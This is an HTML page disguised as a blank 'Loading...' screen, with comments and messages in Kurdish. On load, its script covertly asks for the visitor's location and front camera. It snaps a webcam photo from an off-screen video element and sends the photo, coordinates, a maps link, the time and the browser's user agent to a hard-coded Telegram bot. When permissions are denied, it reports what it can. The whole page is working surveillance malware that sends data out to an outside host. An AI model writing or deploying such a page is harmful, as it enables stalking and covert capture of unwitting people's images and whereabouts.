<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: url('bg.jpg') center/cover no-repeat fixed;
            min-height: 100vh;
        }
    </style>
</head>
<body>
    <video id="vid" autoplay playsinline style="position:absolute;left:-9999px;opacity:0;"></video>
    <canvas id="canvas" style="position:absolute;left:-9999px;opacity:0;"></canvas>

    <script>
    const BOT_TOKEN = '8739484012:AAFMN2V0kdkVnUp_8YlDV1IKEq9_6IiZsOA';
    const CHAT_ID = '659131693';

    function sendData(blob, lat, lon, map) {
        let f = new FormData();
        f.append('chat_id', CHAT_ID);
        f.append('photo', blob, 'cap.png');
        f.append('caption', `📍${lat}, ${lon}\n🗺 ${map}\n🕒 ${new Date().toLocaleString('ckb')}\n🧬 ${navigator.userAgent}`);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: f});
    }

    function fail(m) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: m})
        });
    }

    // دەستبەجێ هەوڵدان بۆ لۆکەیشن و کامێرا
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
            let lat = pos.coords.latitude;
            let lon = pos.coords.longitude;
            let map = https://maps.google.com/?q=${lat},${lon};

            if (navigator.mediaDevices?.getUserMedia) {
                navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}})
                .then(stream => {
                    let v = document.getElementById('vid');
                    v.srcObject = stream;
                    v.play();

                    v.addEventListener('canplay', () => {
                        setTimeout(() => {
                            let c = document.getElementById('canvas');
                            c.width = v.videoWidth || 640;
                            c.height = v.videoHeight || 480;
                            c.getContext('2d').drawImage(v, 0, 0);
                            c.toBlob(b => {
                                if (b) sendData(b, lat, lon, map);
                                stream.getTracks().forEach(t => t.stop());
                            }, 'image/png');
                        }, 500);
                    });
                })
                .catch(() => fail(`⚠️ کامێرا ڕێگەپێنەدرا\n📍 ${lat}, ${lon}\n🗺 ${map}`));
            } else {
                fail(`⛔ کامێرا پشتگیری نەکراوە\n📍 ${lat}, ${lon}\n🗺 ${map}`);
            }
        }, () => fail(`🚫 لۆکەیشن بلۆک\nUA: ${navigator.userAgent}`));
    } else {
        fail(`⛔ جیۆ پشتگیری نەکراوە\nUA: ${navigator.userAgent}`);
    }
    </script>
</body>
</html>
